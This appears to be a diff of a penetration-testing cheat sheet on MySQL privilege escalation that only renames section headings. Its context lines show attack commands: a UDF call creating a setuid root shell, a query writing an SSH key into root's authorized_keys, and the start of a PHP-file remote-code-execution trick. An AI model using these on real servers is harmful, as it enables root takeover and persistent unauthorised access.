@@ -3,7 +3,7 @@ title: "MySQL Privilege Escalation"
 tags: ["Exploitation", "Privilege Escalation In Databases", "Mysql", "RCE", "Database", "php", "UDF"]
 ---
 
-### Abuse #1: User Defined Function (UDF)
+### User Defined Function (UDF)
 
 ```console
 # Get the raptor_udf2.c
@@ -68,7 +68,7 @@ select do_system('cp /bin/bash /tmp/shell; chmod 4777 /tmp/shell');
 
 ---
 
-### Abuse #2: Add SSH Public Key to root
+### Add SSH Public Key to root
 
 ```console
 # Connect to database as root
@@ -92,7 +92,7 @@ select "<PUB_KEY>" into outfile "/root/.ssh/authorized_keys2";
 
 ---
 
-### Abuse #3: Create php File from Database to RCE
+### Create PHP File in Database to RCE
 
 ```console
 create table test(stuff text);
